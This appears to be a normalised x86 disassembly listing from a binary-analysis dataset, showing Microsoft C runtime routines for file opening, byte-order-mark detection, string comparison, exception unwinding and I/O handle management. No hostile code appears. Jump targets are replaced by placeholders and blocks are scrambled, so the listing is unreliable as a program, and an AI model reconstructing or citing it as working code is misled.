je r-xdata
je r-xdata
mov [ ebp - 0xc ] 0x1
jmp r-xdata
sub eax esi
je r-xdata
mov edi 0x40000000
jmp r-xdata
test ecx 0x70000
je r-xdata
mov edi edx
jmp r-xdata
call sub_41151c
mov [ eax ] ebx
mov eax [ ebp + 0xc ]
or [ eax ] 0xffffffff
call sub_411550
push 0x16
pop ebx
mov [ eax ] ebx
call sub_411714
mov eax ebx
jmp r-xdata
xor esi esi
inc esi
cmp eax 0x600
je r-xdata
push 0x3
test eax eax
je r-xdata
mov eax ecx
and eax 0x700
mov esi 0x400
cmp eax esi
jg r-xdata
mov [ ebp - 0xc ] edx
jmp r-xdata
sub eax esi
je r-xdata
mov [ ebp - 0x8 ] edi
mov edi edx
mov [ ebp - 0x8 ] edx
jmp r-xdata
pop edi
pop ebx
leave
retn
test cl 0x40
je r-xdata
mov eax [ rw-data ]
not eax
and eax [ ebp + 0x1c ]
test al al
mov eax ebx
js r-xdata
push 0x5
jmp r-xdata
cmp eax 0x700
je r-xdata
mov edx 0x80
mov eax ebx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x10 ] eax
test ecx 0x100
je r-xdata
cmp eax 0x100
je r-xdata
mov [ ebp - 0xc ] 0x3
jmp r-xdata
sub eax 0x40
jne r-xdata
mov eax [ ebp + 0x18 ]
push esi
push 0x10
pop esi
push 0x2
pop edx
mov [ ebp - 0x28 ] edx
sub eax esi
je r-xdata
test ecx 0x1000
je r-xdata
or edi 0x10000
or [ ebp - 0xc ] 0x4
mov eax 0x4000000
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] edi
xor edx edx
inc edx
mov [ ebp - 0x18 ] edx
pop esi
jmp r-xdata
call sub_41151c
mov [ eax ] ebx
mov eax [ ebp + 0xc ]
or [ eax ] 0xffffffff
call sub_411550
push 0x16
pop ebx
mov [ eax ] ebx
call sub_411714
jmp r-xdata
push 0x4
jmp r-xdata
cmp eax 0x200
je r-xdata
cmp edi 0x80000000
sete al
mov [ ebp - 0xc ] eax
jmp r-xdata
test ecx 0x2000
je r-xdata
or edx 0x100
mov [ ebp - 0x18 ] edx
mov eax ebx
jmp r-xdata
cmp eax 0x300
jne r-xdata
test cl 0x20
je r-xdata
or eax 0x2000000
mov [ ebp - 0x10 ] eax
pop esi
mov esi edx
jmp r-xdata
test cl 0x10
je r-xdata
or eax 0x8000000
jmp r-xdata
call sub_41a0e3
mov edi [ ebp + 0xc ]
mov [ edi ] eax
cmp eax 0xffffffff
jne r-xdata
or eax 0x10000000
mov [ ebp - 0x10 ] eax
push [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
push [ ebp - 0x18 ]
mov [ eax ] 0x1
push esi
lea eax [ ebp - 0x38 ]
push eax
push [ ebp - 0xc ]
push [ ebp - 0x8 ]
push [ ebp + 0x10 ]
call sub_419471
add esp 0x1c
mov [ ebp - 0x1c ] eax
cmp eax 0xffffffff
jne r-xdata
call sub_41151c
mov [ eax ] ebx
or [ edi ] 0xffffffff
call sub_411550
mov [ eax ] 0x18
call sub_411550
mov eax [ eax ]
push eax
call [ GetFileType@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx 0xc0000000
mov eax ecx
and eax edx
cmp eax edx
jne r-xdata
cmp eax 0x2
jne r-xdata
mov ecx [ edi ]
mov eax ecx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
shl ecx 0x6
and [ eax + ecx + 0x4 ] 0xfe
call [ GetLastError@IAT ]
mov esi eax
push esi
call sub_41152f
pop ecx
push [ ebp - 0x1c ]
call [ CloseHandle@IAT ]
test esi esi
jne r-xdata
mov ecx [ edi ]
mov eax ecx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
shl ecx 0x6
and [ eax + ecx + 0x4 ] 0xfe
call [ GetLastError@IAT ]
push eax
call sub_41152f
test [ ebp + 0x14 ] 0x1
je r-xdata
cmp eax 0x3
jne r-xdata
or [ ebp - 0x1 ] 0x40
jmp r-xdata
call sub_411550
mov ebx [ eax ]
jmp r-xdata
call sub_411550
mov [ eax ] 0xd
jmp r-xdata
push [ ebp - 0x10 ]
lea eax [ ebp - 0x38 ]
push [ ebp - 0x18 ]
and ecx 0x7fffffff
push esi
push eax
push [ ebp - 0xc ]
mov [ ebp - 0x8 ] ecx
push ecx
push [ ebp + 0x10 ]
call sub_419471
add esp 0x1c
mov [ ebp - 0x1c ] eax
cmp eax 0xffffffff
jne r-xdata
push [ ebp - 0x1c ]
push [ edi ]
call sub_41a375
mov dl [ ebp - 0x1 ]
pop ecx
pop ecx
mov ecx [ edi ]
mov eax ecx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
shl ecx 0x6
or dl 0x1
mov [ eax + ecx + 0x4 ] dl
mov ecx [ edi ]
mov eax ecx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
shl ecx 0x6
mov [ ebp - 0x1 ] dl
and [ eax + ecx + 0x24 ] 0x80
mov ecx [ ebp + 0x14 ]
mov al dl
and al 0x48
mov [ ebp - 0x3 ] al
jne r-xdata
or [ ebp - 0x1 ] 0x8
test dl dl
jns r-xdata
test dl dl
jns r-xdata
mov edx [ edi ]
mov eax edx
sar eax 0x5
and edx 0x1f
mov ecx [ eax * 4 + rw-data ]
shl edx 0x6
mov al [ ecx + edx + 0x24 ]
xor al [ ebp - 0x2 ]
and al 0x7f
xor [ ecx + edx + 0x24 ] al
mov esi [ edi ]
mov ecx [ ebp + 0x14 ]
mov eax esi
sar eax 0x5
and esi 0x1f
mov edx [ eax * 4 + rw-data ]
shl esi 0x6
shr ecx 0x10
mov al [ edx + esi + 0x24 ]
shl cl 0x7
and al 0x7f
or cl al
mov [ edx + esi + 0x24 ] cl
mov ecx [ ebp + 0x14 ]
cmp [ ebp - 0x3 ] bl
jne r-xdata
test ecx 0x74000
jne r-xdata
test cl 0x2
je r-xdata
mov esi [ ebp - 0x8 ]
mov edx 0xc0000000
mov eax esi
and eax edx
cmp eax edx
jne r-xdata
test cl 0x8
je r-xdata
mov eax ecx
and eax 0x74000
cmp eax 0x4000
je r-xdata
mov eax [ ebp - 0x20 ]
and eax 0x74000
jne r-xdata
push 0x2
push 0xffffffff
push 0xffffffff
push [ edi ]
call sub_413239
mov ecx eax
and ecx edx
add esp 0x10
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x14 ] edx
cmp ecx 0xffffffff
jne r-xdata
test cl 0x1
je r-xdata
mov ecx [ edi ]
mov eax ecx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
shl ecx 0x6
or [ eax + ecx + 0x4 ] 0x20
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x2 ] bl
cmp eax 0x10000
je r-xdata
or ecx eax
or ecx 0x4000
jmp r-xdata
push 0x1
lea eax [ ebp - 0x24 ]
push eax
push [ edi ]
mov [ ebp - 0x24 ] ebx
call sub_4133e3
add esp 0xc
test eax eax
jne r-xdata
call sub_41151c
cmp [ eax ] 0x83
je r-xdata
push [ ebp - 0x1c ]
call [ CloseHandle@IAT ]
push [ ebp - 0x10 ]
lea eax [ ebp - 0x38 ]
push [ ebp - 0x18 ]
and esi 0x7fffffff
push 0x3
push eax
push [ ebp - 0xc ]
push esi
push [ ebp + 0x10 ]
call sub_419471
add esp 0x1c
cmp eax 0xffffffff
jne r-xdata
mov [ ebp - 0x14 ] ebx
test dl 0x40
jne r-xdata
mov eax ecx
and eax 0x301
cmp eax 0x301
jne r-xdata
cmp eax 0x14000
je r-xdata
mov [ ebp + 0x14 ] ecx
push ebx
push ebx
push ebx
push [ edi ]
call sub_413239
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
cmp [ ebp - 0x24 ] 0x1a
jne r-xdata
mov dl [ ebp - 0x1 ]
mov ecx [ ebp + 0x14 ]
push [ edi ]
call sub_413eea
jmp r-xdata
mov edx [ edi ]
mov ecx edx
sar ecx 0x5
and edx 0x1f
mov ecx [ ecx * 4 + rw-data ]
shl edx 0x6
mov [ edx + ecx ] eax
call [ GetLastError@IAT ]
push eax
call sub_41152f
mov ecx [ edi ]
mov eax ecx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
shl ecx 0x6
and [ eax + ecx + 0x4 ] 0xfe
push [ edi ]
call sub_41a288
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov ecx 0xc0000000
and eax ecx
cmp eax 0x40000000
je r-xdata
test ecx 0x70000
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
cmp eax 0x20000
je r-xdata
push [ ebp - 0x14 ]
push [ ebp - 0x2c ]
push [ edi ]
call sub_41ca78
add esp 0xc
cmp eax 0xffffffff
je r-xdata
pop ecx
test esi esi
je r-xdata
cmp eax 0x80000000
je r-xdata
cmp eax 0x24000
je r-xdata
push 0x2
pop ecx
cmp esi ecx
jbe r-xdata
push 0x3
lea eax [ ebp - 0x14 ]
push eax
push [ edi ]
call sub_4133e3
add esp 0xc
cmp eax 0xffffffff
je r-xdata
cmp eax ecx
jne r-xdata
cmp eax 0x40000
je r-xdata
movsx eax [ ebp - 0x2 ]
mov esi ebx
dec eax
je r-xdata
cmp esi 0x4
ja r-xdata
mov ecx [ ebp - 0x14 ]
push 0x2
pop edx
cmp eax edx
je r-xdata
test esi esi
je r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
cmp eax 0x44000
jne r-xdata
push 0x3
pop ecx
mov [ ebp - 0x14 ] 0xbfbbef
mov [ ebp - 0x28 ] ecx
dec eax
jne r-xdata
cmp esi 0x5
je r-xdata
push ecx
push ebx
push ebx
push [ edi ]
call sub_413239
add esp 0x10
or eax edx
je r-xdata
and ecx 0xffff
cmp ecx 0xfffe
jne r-xdata
cmp eax 0x3
jne r-xdata
push 0x2
pop ecx
cmp esi ecx
jbe r-xdata
mov ecx [ ebp - 0x28 ]
add esi eax
cmp ecx esi
jg r-xdata
mov [ ebp - 0x14 ] 0xfeff
jmp r-xdata
jmp r-xdata
push 0x2
pop ecx
push ebx
push ebx
push ebx
push [ edi ]
call sub_413239
and eax edx
add esp 0x10
cmp eax 0xffffffff
jne r-xdata
cmp ecx 0xfeff
jne r-xdata
push [ edi ]
call sub_413eea
pop ecx
call sub_411550
push 0x16
pop ebx
mov [ eax ] ebx
jmp r-xdata
cmp ecx 0xbfbbef
jne r-xdata
cmp esi 0x4
jbe r-xdata
mov eax ecx
sub eax esi
push eax
lea eax [ ebp - 0x14 ]
add eax esi
push eax
push [ edi ]
call sub_4141f0
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
push ebx
push ebx
push edx
push [ edi ]
call sub_413239
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
push ecx
push ebx
push ebx
push [ edi ]
call sub_413239
add esp 0x10
or eax edx
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
push ebx
push ebx
push ebx
push [ edi ]
call sub_413239
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
sub_419d38
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push esi
pop ebp
retn
movzx eax [ edx ]
movzx ecx [ ecx ]
sub eax ecx
pop esi
pop ebp
retn
movzx esi [ edx ]
test si si
je r-xdata
cmp si [ ecx ]
jne r-xdata
add edx 0x2
add ecx 0x2
jmp r-xdata
dec eax
je r-xdata
sub_419d6e
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x0
push edi
jne r-xdata
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_419e22
add esp 0x10
mov edi [ ebp + 0x10 ]
xor eax eax
test edi edi
je r-xdata
pop edi
leave
retn
mov edx [ ebp + 0x8 ]
test edx edx
jne r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
call sub_411550
mov [ eax ] 0x16
call sub_411714
mov eax 0x7fffffff
jmp r-xdata
push ebx
push esi
push 0x41
pop ebx
push 0x5a
pop esi
sub edx ecx
mov [ ebp - 0x4 ] esi
jmp r-xdata
movzx eax [ edx + ecx ]
cmp ax bx
jb r-xdata
mov esi eax
cmp ax si
ja r-xdata
add ecx 0x2
dec edi
je r-xdata
cmp ax [ ebp - 0x4 ]
ja r-xdata
add eax 0x20
movzx esi ax
jmp r-xdata
movzx ecx ax
movzx eax si
pop esi
sub eax ecx
pop ebx
jmp r-xdata
test si si
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ ecx ]
cmp ax bx
jb r-xdata
cmp si ax
je r-xdata
push 0x5a
pop esi
sub_419e22
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
xor esi esi
push edi
cmp [ ebp + 0x10 ] esi
je r-xdata
mov eax esi
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
call sub_411550
mov [ eax ] 0x16
call sub_411714
mov eax 0x7fffffff
jmp r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x14 ]
call sub_40f858
mov eax [ ebp - 0x14 ]
cmp [ eax + 0xa8 ] esi
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x14 ]
push eax
movzx eax [ ebx ]
push eax
call sub_415b76
movzx esi ax
lea eax [ ebp - 0x14 ]
push eax
movzx eax [ edi ]
push eax
call sub_415b76
add esp 0x10
dec [ ebp + 0x10 ]
movzx eax ax
lea ebx [ ebx + 0x2 ]
lea edi [ edi + 0x2 ]
je r-xdata
mov ecx [ ebp + 0x10 ]
push 0x41
pop edx
push 0x5a
pop esi
sub ebx edi
mov [ ebp - 0x4 ] esi
jmp r-xdata
movzx eax ax
movzx esi si
sub esi eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
test si si
je r-xdata
movzx eax [ ebx + edi ]
cmp ax dx
jb r-xdata
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
cmp si ax
je r-xdata
mov esi eax
cmp ax si
ja r-xdata
add edi 0x2
dec ecx
je r-xdata
cmp ax [ ebp - 0x4 ]
ja r-xdata
add eax 0x20
movzx esi ax
jmp r-xdata
test si si
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ edi ]
cmp ax dx
jb r-xdata
cmp si ax
je r-xdata
push 0x5a
pop esi
jmp r-xdata
sub_419f20
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419f40
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_40e09b
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_419f85
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_419f85
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_419f40
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_41a035
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_41a054
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_41a02c
push ebx
push ecx
mov ebx rw-data
jmp r-xdata
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_41a035
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_41a057
push 0x8
push r--data
call sub_4110a0
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov eax edi
sar eax 0x5
and edi 0x1f
shl edi 0x6
mov eax [ eax * 4 + rw-data ]
add eax 0xc
add eax edi
push eax
call [ EnterCriticalSection@IAT ]
xor eax eax
inc eax
call sub_4110e5
retn
push 0xa
call sub_4162e1
pop ecx
and [ ebp - 0x4 ] 0x0
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41a0da
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
inc [ esi + 0x8 ]
sub_41a0e3
push 0x18
push r--data
call sub_4110a0
or esi 0xffffffff
mov [ ebp - 0x1c ] esi
and [ ebp - 0x24 ] 0x0
push 0xb
call sub_416369
pop ecx
test eax eax
jne r-xdata
push 0xb
call sub_4162e1
pop ecx
and [ ebp - 0x4 ] 0x0
xor ebx ebx
or eax esi
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41a27f
mov eax esi
mov edi [ ebx * 4 + rw-data ]
test edi edi
je r-xdata
call sub_4110e5
retn
push 0x40
push 0x20
call sub_410fc1
pop ecx
pop ecx
mov ecx eax
mov [ ebp - 0x20 ] ecx
test ecx ecx
je r-xdata
mov [ ebp - 0x20 ] edi
mov eax [ ebx * 4 + rw-data ]
add eax 0x800
cmp edi eax
jae r-xdata
mov [ ebx * 4 + rw-data ] ecx
add [ rw-data ] 0x20
cmp esi 0xffffffff
jne r-xdata
test [ edi + 0x4 ] 0x1
jne r-xdata
mov esi ebx
shl esi 0x5
mov [ ebp - 0x1c ] esi
mov eax esi
sar eax 0x5
mov ecx esi
and ecx 0x1f
shl ecx 0x6
mov eax [ eax * 4 + rw-data ]
mov [ eax + ecx + 0x4 ] 0x1
push esi
call sub_41a057
pop ecx
test eax eax
jne r-xdata
mov [ ecx + 0x4 ] 0xa00
or [ ecx ] 0xffffffff
and [ ecx + 0x8 ] 0x0
add ecx 0x40
mov [ ebp - 0x20 ] ecx
jmp r-xdata
inc ebx
jmp r-xdata
add edi 0x40
jmp r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
or esi 0xffffffff
mov [ ebp - 0x1c ] esi
mov eax [ ebx * 4 + rw-data ]
add eax 0x800
cmp ecx eax
jae r-xdata
mov [ ebp - 0x28 ] ebx
cmp ebx 0x40
jge r-xdata
mov eax [ ebp - 0x24 ]
test eax eax
jne r-xdata
push 0xa
call sub_4162e1
pop ecx
mov [ ebp - 0x4 ] 0x1
cmp [ edi + 0x8 ] 0x0
jne r-xdata
lea eax [ edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
test [ edi + 0x4 ] 0x1
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_41a1b7
push 0xfa0
lea eax [ edi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
inc [ edi + 0x8 ]
mov eax [ ebp - 0x24 ]
test eax eax
jne r-xdata
lea eax [ edi + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
mov [ edi + 0x4 ] 0x1
or [ edi ] 0xffffffff
mov esi edi
sub esi [ ebx * 4 + rw-data ]
sar esi 0x6
mov eax ebx
shl eax 0x5
add esi eax
mov [ ebp - 0x1c ] esi
sub_41a288
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push edi
test eax eax
js r-xdata
call sub_411550
mov [ eax ] 0x9
call sub_41151c
and [ eax ] 0x0
or eax 0xffffffff
cmp eax [ rw-data ]
jae r-xdata
mov edi eax
sar edi 0x5
mov esi eax
mov ecx [ edi * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
test [ esi + ecx + 0x4 ] 0x1
je r-xdata
cmp [ esi + ecx ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi * 4 + rw-data ]
or [ esi + eax ] 0xffffffff
xor eax eax
jmp r-xdata
xor ecx ecx
sub eax ecx
je r-xdata
pop edi
pop esi
pop ebp
retn
push ecx
push 0xfffffff6
dec eax
je r-xdata
push ecx
push 0xfffffff5
jmp r-xdata
dec eax
jne r-xdata
call [ SetStdHandle@IAT ]
push ecx
push 0xfffffff4
jmp r-xdata
sub_41a30e
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_41151c
and [ eax ] 0x0
call sub_411550
mov [ eax ] 0x9
jmp r-xdata
call sub_41151c
and [ eax ] 0x0
call sub_411550
mov [ eax ] 0x9
call sub_411714
cmp ecx [ rw-data ]
jae r-xdata
or eax 0xffffffff
pop ebp
retn
mov eax ecx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
shl ecx 0x6
test [ eax + ecx + 0x4 ] 0x1
je r-xdata
mov eax [ eax + ecx ]
pop ebp
retn
sub_41a375
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
push edi
test ecx ecx
js r-xdata
call sub_411550
mov [ eax ] 0x9
call sub_41151c
and [ eax ] 0x0
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
mov ebx ecx
sar ebx 0x5
mov edi ecx
mov eax [ ebx * 4 + rw-data ]
and edi 0x1f
shl edi 0x6
cmp [ edi + eax ] 0xffffffff
jne r-xdata
cmp [ rw-data ] 0x1
push esi
mov esi [ ebp + 0xc ]
jne r-xdata
mov eax [ ebx * 4 + rw-data ]
mov [ edi + eax ] esi
xor eax eax
pop esi
jmp r-xdata
sub ecx 0x0
je r-xdata
pop edi
pop ebx
pop ebp
retn
push esi
push 0xfffffff6
dec ecx
je r-xdata
push esi
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push esi
push 0xfffffff4
jmp r-xdata
sub_41a3f7
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax ecx
and ecx 0x1f
sar eax 0x5
shl ecx 0x6
mov eax [ eax * 4 + rw-data ]
add ecx 0xc
add eax ecx
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_41a41d
push 0x14
push r--data
call sub_4110a0
mov edi [ ebp + 0x8 ]
cmp edi 0xfffffffe
jne r-xdata
test edi edi
js r-xdata
call sub_411550
mov [ eax ] 0x9
jmp r-xdata
call sub_411550
mov [ eax ] 0x9
call sub_411714
cmp edi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov eax edi
sar eax 0x5
mov [ ebp - 0x20 ] eax
mov ebx edi
and ebx 0x1f
shl ebx 0x6
mov eax [ eax * 4 + rw-data ]
movsx eax [ ebx + eax + 0x4 ]
and eax 0x1
je r-xdata
push edi
call sub_41a057
pop ecx
xor esi esi
mov [ ebp - 0x4 ] esi
mov eax [ ebp - 0x20 ]
mov eax [ eax * 4 + rw-data ]
test [ ebx + eax + 0x4 ] 0x1
je r-xdata
call sub_411550
mov [ eax ] 0x9
or esi 0xffffffff
mov [ ebp - 0x1c ] esi
push edi
call sub_41a30e
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
call sub_4110e5
retn
mov [ ebp - 0x1c ] esi
test esi esi
je r-xdata
call [ GetLastError@IAT ]
mov esi eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41a4e2
mov eax esi
jmp r-xdata
call sub_41151c
mov [ eax ] esi
sub_41a5cb
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
cmp eax 0xfffffffe
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
call sub_41cd3a
mov eax [ rw-data ]
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
je r-xdata
mov eax 0xffff
leave
retn
mov ax [ ebp + 0x8 ]
leave
retn
sub_41a60c
push 0x14
push r--data
call sub_4110a0
and [ ebp - 0x1c ] 0x0
xor eax eax
mov esi [ ebp + 0x18 ]
test esi esi
setne al
test eax eax
jne r-xdata
or [ esi ] 0xffffffff
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
test eax eax
je r-xdata
call sub_411550
push 0x16
pop esi
mov [ eax ] esi
call sub_411714
mov eax esi
jmp r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
call sub_4110e5
retn
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push esi
lea eax [ ebp - 0x1c ]
push eax
call sub_41a6d3
add esp 0x1c
mov edi eax
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41a6a7
test edi edi
je r-xdata
mov eax [ ebp + 0x14 ]
and eax 0xfffffe7f
neg eax
sbb eax eax
inc eax
je r-xdata
mov eax edi
or [ esi ] 0xffffffff
sub_41a6a7
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
test edi edi
je r-xdata
push [ esi ]
call sub_41a3f7
pop ecx
mov ecx [ esi ]
mov eax ecx
sar eax 0x5
and ecx 0x1f
shl ecx 0x6
mov eax [ eax * 4 + rw-data ]
and [ eax + ecx + 0x4 ] 0xfe
sub_41a6d3
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
call sub_40fbb9
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp - 0x4 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4195c9
push [ ebp - 0x4 ]
mov esi eax
call sub_40e8f2
add esp 0x20
mov eax esi
pop esi
leave
retn
or eax 0xffffffff
leave
retn
sub_41a755
push ebp
mov ebp esp
sub esp 0x14
push esi
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
push ebx
push edi
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x14 ]
call sub_40f858
mov eax [ ebp - 0x10 ]
xor edx edx
cmp [ eax + 0x8 ] edx
jne r-xdata
xor eax eax
jmp r-xdata
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41cd60
add esp 0xc
mov edx eax
jmp r-xdata
pop esi
leave
retn
call sub_411550
mov [ eax ] 0x16
call sub_411714
mov edx 0x7fffffff
jmp r-xdata
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
pop edi
pop ebx
je r-xdata
movzx ecx [ ebx ]
mov edx [ ebp - 0x10 ]
dec esi
mov eax ecx
inc ebx
test [ eax + edx + 0x19 ] 0x4
push 0x0
mov [ ebp - 0x4 ] ebx
pop edx
je r-xdata
mov eax edx
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
movzx ebx [ edi ]
mov edx [ ebp - 0x10 ]
mov eax ebx
inc edi
test [ eax + edx + 0x19 ] 0x4
push 0x0
pop edx
je r-xdata
test esi esi
jne r-xdata
cmp bx cx
jne r-xdata
test esi esi
jne r-xdata
mov al [ ebx ]
test al al
jne r-xdata
movzx eax [ edi ]
mov ebx [ ebp - 0x10 ]
mov ecx edx
test [ eax + ebx + 0x19 ] 0x4
jne r-xdata
sbb edx edx
and edx 0x2
dec edx
test cx cx
je r-xdata
mov al [ edi ]
dec esi
test al al
je r-xdata
mov ebx edx
jmp r-xdata
shl ecx 0x8
movzx eax al
or cx ax
inc ebx
movzx ecx cx
mov [ ebp - 0x4 ] ebx
mov ecx edx
jmp r-xdata
mov al [ edi ]
movzx ebx al
jmp r-xdata
mov ebx [ ebp - 0x4 ]
test esi esi
jne r-xdata
shl ebx 0x8
movzx eax al
or bx ax
movzx ebx bx
inc edi
jmp r-xdata
sub_41a882
push ebp
mov ebp esp
sub esp 0x18
lea ecx [ ebp - 0x18 ]
push ebx
push esi
push edi
push [ ebp + 0x14 ]
call sub_40f858
mov edi [ ebp + 0x10 ]
xor edx edx
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x0
pop edi
pop esi
pop ebx
je r-xdata
mov ecx [ ebp - 0x14 ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax edx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
